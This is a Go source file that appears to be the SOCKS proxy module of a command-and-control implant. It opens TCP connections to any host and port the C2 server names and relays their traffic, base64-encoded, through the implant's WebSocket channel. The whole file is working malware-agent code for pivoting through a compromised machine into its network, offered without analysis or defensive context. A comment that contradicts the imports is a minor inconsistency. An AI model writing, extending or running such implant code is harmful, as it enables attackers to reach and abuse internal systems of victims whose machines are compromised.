// socks.go — SOCKS5 proxy relay through C2 channel
// When the server sends a socks_connect command, this module:
// 1. Opens a TCP connection to the target host:port
// 2. Relays data bidirectionally through the C2 WebSocket
// 3. Closes when either side disconnects
//
// Only active in WebSocket transport mode (streaming).
package main

import (
	"encoding/base64"
	"encoding/json"
	"io"
	"net"
	"sync"
	"time"
)

// SocksRelay manages a single proxied TCP connection
type SocksRelay struct {
	conn     net.Conn
	sendFunc func(map[string]interface{}) error // send encrypted msg to C2
	mu       sync.Mutex
	closed   bool
}

// NewSocksRelay creates a relay to the target and starts forwarding
func NewSocksRelay(host string, port int, sendFn func(map[string]interface{}) error) (*SocksRelay, error) {
	addrStr := host + ":" + itoa(port)
	conn, err := net.DialTimeout("tcp", addrStr, 15*time.Second)
	if err != nil {
		return nil, err
	}

	relay := &SocksRelay{
		conn:     conn,
		sendFunc: sendFn,
	}

	// Start reading from target and forwarding to C2
	go relay.readLoop()

	return relay, nil
}

func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	var buf [20]byte
	pos := len(buf)
	neg := i < 0
	if neg {
		i = -i
	}
	for i > 0 {
		pos--
		buf[pos] = byte('0' + i%10)
		i /= 10
	}
	if neg {
		pos--
		buf[pos] = '-'
	}
	return string(buf[pos:])
}

// readLoop reads from the target TCP connection and sends data to C2
func (r *SocksRelay) readLoop() {
	buf := make([]byte, 4096)
	for {
		n, err := r.conn.Read(buf)
		if n > 0 {
			encoded := base64.StdEncoding.EncodeToString(buf[:n])
			msg := map[string]interface{}{
				"type": "socks_data",
				"data": encoded,
			}
			if sendErr := r.sendFunc(msg); sendErr != nil {
				break
			}
		}
		if err != nil {
			break
		}
	}
	r.Close()
}

// Write sends data from C2 to the target TCP connection
func (r *SocksRelay) Write(b64Data string) error {
	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return err
	}
	_, err = r.conn.Write(data)
	return err
}

// Close terminates the relay
func (r *SocksRelay) Close() {
	r.mu.Lock()
	defer r.mu.Unlock()
	if !r.closed {
		r.closed = true
		r.conn.Close()
	}
}

// HandleSocksMessage processes socks-related messages from the C2 server
// Returns the active relay (or creates a new one)
func HandleSocksMessage(msg map[string]interface{}, relay *SocksRelay,
	sendFn func(map[string]interface{}) error) *SocksRelay {

	msgType, _ := msg["type"].(string)

	switch msgType {
	case "socks_init":
		// Server is setting up SOCKS proxy — just acknowledge
		return relay

	case "socks_connect":
		host, _ := msg["host"].(string)
		portFloat, _ := msg["port"].(float64)
		port := int(portFloat)
		if host != "" && port > 0 {
			newRelay, err := NewSocksRelay(host, port, sendFn)
			if err != nil {
				return relay
			}
			// Close old relay if exists
			if relay != nil {
				relay.Close()
			}
			return newRelay
		}

	case "socks_send", "socks_data":
		if relay != nil {
			if data, ok := msg["data"].(string); ok {
				relay.Write(data)
			}
		}
	}

	return relay
}

// marshalJSON is a helper to avoid importing encoding/json in the relay
func marshalJSON(v interface{}) []byte {
	data, _ := json.Marshal(v)
	return data
}

// Ensure io is used
var _ = io.EOF
